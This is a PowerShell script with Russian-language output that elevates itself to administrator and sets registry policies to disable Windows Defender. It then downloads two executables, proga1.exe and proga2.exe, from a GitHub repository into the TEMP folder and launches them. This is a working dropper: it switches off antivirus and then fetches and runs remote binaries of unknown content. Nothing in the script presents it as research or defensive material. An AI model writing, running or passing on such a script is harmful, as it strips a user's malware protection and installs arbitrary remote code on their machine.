Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Повышение прав не сработало :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

Write-Host "=== Отключение Windows Defender ===" -ForegroundColor Yellow

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { 
    New-Item -Path $DefenderPath -Force 
}
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue

try {
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction Stop
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction Stop
    Write-Host "Windows Defender ОТКЛЮЧЕН" -ForegroundColor Green
} catch {
    Write-Host "Ошибка установки реестра: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== Скачивание и запуск файлов ===" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    if (Test-Path $dest) { 
        Remove-Item $dest -Force -ErrorAction SilentlyContinue 
    }
    
    try {
        Write-Host "Скачивание с: $url" -ForegroundColor Gray
        # Используем WebClient вместо BITS (не зависает)
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $dest)
        $webClient.Dispose()
        return $true
    } catch {
        Write-Host "WebClient ошибка: $($_.Exception.Message)" -ForegroundColor DarkYellow
        try {
            # Альтернативный метод
            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
            return $true
        } catch {
            Write-Host "Invoke-WebRequest ошибка: $($_.Exception.Message)" -ForegroundColor DarkYellow
            return $false
        }
    }
}

# Проверка интернета с таймаутом
try {
    $request = [System.Net.WebRequest]::Create("https://github.com")
    $request.Timeout = 5000
    $request.GetResponse() | Out-Null
    Write-Host "Интернет соединение: OK" -ForegroundColor Green
} catch {
    Write-Host "ВНИМАНИЕ: Нет интернета: $($_.Exception.Message)" -ForegroundColor Red
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "`n[1/2] Скачивание proga1.exe..." -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    if ((Get-Item $dest1).Length -gt 0) {
        Write-Host "УСПЕХ: proga1.exe скачан ($([math]::Round((Get-Item $dest1).Length / 1KB, 2)) KB)" -ForegroundColor Green
        $downloaded++
    } else {
        Write-Host "ОШИБКА: proga1.exe пустой" -ForegroundColor Red
    }
} else {
    Write-Host "ОШИБКА: proga1.exe" -ForegroundColor Red
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "`n[2/2] Скачивание proga2.exe..." -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    if ((Get-Item $dest2).Length -gt 0) {
        Write-Host "УСПЕХ: proga2.exe скачан ($([math]::Round((Get-Item $dest2).Length / 1KB, 2)) KB)" -ForegroundColor Green
        $downloaded++
    } else {
        Write-Host "ОШИБКА: proga2.exe пустой" -ForegroundColor Red
    }
} else {
    Write-Host "ПРЕДУПРЕЖДЕНИЕ: proga2.exe не найден на сервере" -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        Write-Host "Создан proga2.exe как копия proga1.exe" -ForegroundColor Green
        $downloaded++
    } else {
        Write-Host "ОШИБКА: Нельзя создать proga2.exe (proga1.exe отсутствует)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "=== Запуск файлов ===" -ForegroundColor Yellow

if (Test-Path $dest1) {
    Write-Host "Запуск proga1.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest1 -WindowStyle Normal
} else {
    Write-Host "proga1.exe не найден!" -ForegroundColor Red
}

if (Test-Path $dest2) {
    Start-Sleep -Seconds 1
    Write-Host "Запуск proga2.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest2 -WindowStyle Normal
} else {
    Write-Host "proga2.exe не найден!" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== ГОТОВО ($downloaded/2 файлов обработано) ===" -ForegroundColor Green
Write-Host ""
Write-Host "Нажмите любую клавишу для выхода..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
